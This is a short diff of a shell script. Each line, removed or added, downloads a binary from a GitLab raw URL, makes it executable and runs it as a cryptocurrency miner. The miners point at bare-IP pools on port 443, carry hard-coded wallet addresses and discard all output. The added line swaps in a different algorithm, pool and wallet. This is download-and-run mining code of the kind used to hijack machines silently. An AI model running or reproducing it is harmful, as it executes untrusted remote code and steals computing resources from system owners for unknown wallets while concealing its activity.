@@ -1,2 +1,1 @@
-#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 138.197.44.235 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qzja73s3gh7u7aqyxaaze6a32pe2j7lgxe8hj9fm3ujkuldprlafuynx648hu --threads 4 > /dev/null 2>&1
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://165.227.65.49:443 -u RPDjMw2abQSdBCLmuFk5WmMAMhM37yPrJd -p c=RVN -t4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yescryptR16 -o stratum+tcp://24.144.107.222:443 -u DNbHCwVeAoGVAA49s62RTXpdcjZk5w17eE -p c=DGB,mc=BTE,m=solo,ID=bocoralus -t4 > /dev/null 2>&1
